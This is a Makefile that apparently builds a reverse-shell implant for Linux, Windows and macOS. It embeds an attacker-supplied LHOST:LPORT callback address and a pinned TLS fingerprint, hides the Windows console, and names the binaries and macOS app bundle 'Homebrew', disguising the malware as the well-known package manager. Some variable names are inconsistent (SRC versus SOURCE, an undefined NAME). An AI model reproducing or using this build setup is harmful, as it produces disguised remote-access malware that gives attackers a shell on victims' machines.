# Makefile
BUILD=go build 
GENERATE= go generate
MAKEWINAPP= go run ./winexe/windows.go
SOURCE=main.go
MAKEAPP=go run ./appmaker/mac.go
OUT_LINUX=Homebrew
OUT_WINDOWS=Homebrew.exe
SRV_KEY=server.key 
DOMAIN=kaizentek
SRV_PEM=server.pem 
LINUX_LDFLAGS=--ldflags "-X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=$$(openssl x509 -fingerprint -sha256 -noout -in ${SRV_PEM} | cut -d '=' -f2)"
WINDOWS_LDFLAGS=--ldflags "-X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=$$(openssl x509 -fingerprint -sha256 -noout -in ${SRV_PEM} | cut -d '=' -f2) -H=windowsgui"

all: clean depends shell

dependencies:
	openssl req -subj '/CN=kaizentek.io/O=KaizenTek/C=US' -new -newkey rsa:4096 -days 3650 -nodes -x509 -keyout ${SRV_KEY} -out ${SRV_PEM}

shell: 
	GOOS=${GOOS} GOARCH=${GOARCH} ${BUILD} ${LINUX_LDFLAGS} -o ./dist/linux/${OUT_LINUX} ${SRC}

linux32:
	GOOS=linux GOARCH=386 ${BUILD} ${LINUX_LDFLAGS} -o ./dist/linux/${OUT_LINUX} ${SRC}

linux64:
	GOOS=linux GOARCH=amd64 ${BUILD} ${LINUX_LDFLAGS} -o ./dist/linux/${OUT_LINUX} ${SRC} 

windows32:
	GOOS=windows GOARCH=386 ${BUILD} ${WINDOWS_LDFLAGS} -o ./dist/windows/${OUT_WINDOWS} ${SRC}

windows64:
	${MAKEWINAPP}
	${GENERATE}
	GOOS=windows GOARCH=amd64 ${BUILD} ${WINDOWS_LDFLAGS} -o ./dist/windows/${OUT_WINDOWS} ${SRC}

macos32:
	GOOS=darwin GOARCH=386 ${BUILD} ${LINUX_LDFLAGS} -o ./dist/osx/Homebrew.app/Contents/MacOS/${OUT_LINUX} ${SRC}
	${MAKEAPP} -assets ./assets -bin ${NAME} -icon ./assets/${NAME}.png -identifier com.${DOMAIN}.app -name ${NAME} -dmg ./appmaker/Homebrew.dmg -o ./dist/osx 

macos64:
	GOOS=darwin GOARCH=amd64 ${BUILD} ${LINUX_LDFLAGS} -o ./dist/osx/Homebrew.app/Contents/MacOS/${OUT_LINUX} ${SRC}
	${MAKEAPP} -assets ./assets -bin ${NAME} -icon ./assets/${NAME}.png -identifier com.${DOMAIN}.app -name ${NAME} -dmg ./appmaker/Homebrew.dmg -o ./dist/osx 
clean:
	rm -rf ${SRV_KEY} ${SRV_PEM} ./dist/linux/* ./dist/windows/* ./dist/osx/* ./versioninfo.json ./resource.syso
	